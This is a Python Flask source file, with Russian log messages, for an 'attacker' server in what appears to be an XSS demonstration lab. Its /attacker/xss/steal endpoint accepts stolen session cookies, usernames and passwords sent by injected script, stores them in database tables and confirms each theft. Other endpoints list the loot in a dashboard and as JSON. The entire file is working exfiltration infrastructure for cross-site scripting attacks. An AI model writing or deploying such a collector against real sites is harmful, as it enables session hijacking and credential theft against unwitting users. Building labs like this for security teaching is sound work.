from flask_cors import CORS, cross_origin
import psycopg2
from flask import Blueprint, request, jsonify, render_template
import db

attacker = Blueprint('attacker', __name__, template_folder='../templates', static_folder='../static')
CORS(attacker, origins=["http://localhost:8080"])

def get_db_connection():
    return db.get_db()

@attacker.route('/attacker', methods=['GET'])
@attacker.route('/attacker/', methods=['GET'])
def attacker_page():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT cookie, stolen_at FROM stolen_cookies ORDER BY stolen_at DESC;")
        cookies = cur.fetchall()
        cur.execute("SELECT username, password, stolen_at FROM stolen_credentials ORDER BY stolen_at DESC;")
        credentials = cur.fetchall()
        cur.close()
        conn.close()
        return render_template("main.html", cookies=cookies, credentials=credentials)
    except Exception as e:
        print(f"[ERROR] Ошибка базы данных: {str(e)}")
        return render_template("main.html", error=f"Ошибка базы данных: {str(e)}")

@attacker.route('/attacker/logs', methods=['GET'])
def get_stolen_cookies():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT cookie, stolen_at FROM stolen_cookies ORDER BY stolen_at DESC;")
        cookies = cur.fetchall()
        cur.execute("SELECT username, password, stolen_at FROM stolen_credentials ORDER BY stolen_at DESC;")
        credentials = cur.fetchall()
        cur.close()
        conn.close()

        return jsonify({
            "stolen_cookies": [{"cookie": row[0], "stolen_at": str(row[1])} for row in cookies],
            "stolen_credentials": [{"username": row[0], "password": row[1], "stolen_at": str(row[2])} for row in credentials]
        })
    except Exception as e:
        print(f"[ERROR] Ошибка базы данных: {str(e)}")
        return jsonify({"error": f"Ошибка базы данных: {str(e)}"}), 500

@attacker.route('/attacker/xss/steal', methods=['GET'])
@cross_origin(origins=["http://localhost:8080"])
def steal_cookies():
    stolen_cookie = request.args.get('cookie', None)
    if stolen_cookie:
        print(f"[XSS COOKIE THEFT] Получен cookie: {stolen_cookie}")
        try:
            conn = get_db_connection()
            cur = conn.cursor()
            cur.execute("INSERT INTO stolen_cookies (cookie) VALUES (%s)", (stolen_cookie,))
            conn.commit()
            cur.close()
            conn.close()
        except Exception as e:
            print(f"Ошибка записи в БД: {str(e)}")
        return jsonify({"message": "Cookie stolen!"}), 200

    username = request.args.get('username', 'Не указано')
    password = request.args.get('password', 'Не указано')
    print(f"[XSS CREDENTIAL THEFT] Получены данные: username={username}, password={password}")
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("INSERT INTO stolen_credentials (username, password) VALUES (%s, %s)", (username, password))
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        print(f"Ошибка записи в БД: {str(e)}")
    return jsonify({"message": "Credentials stolen!"}), 200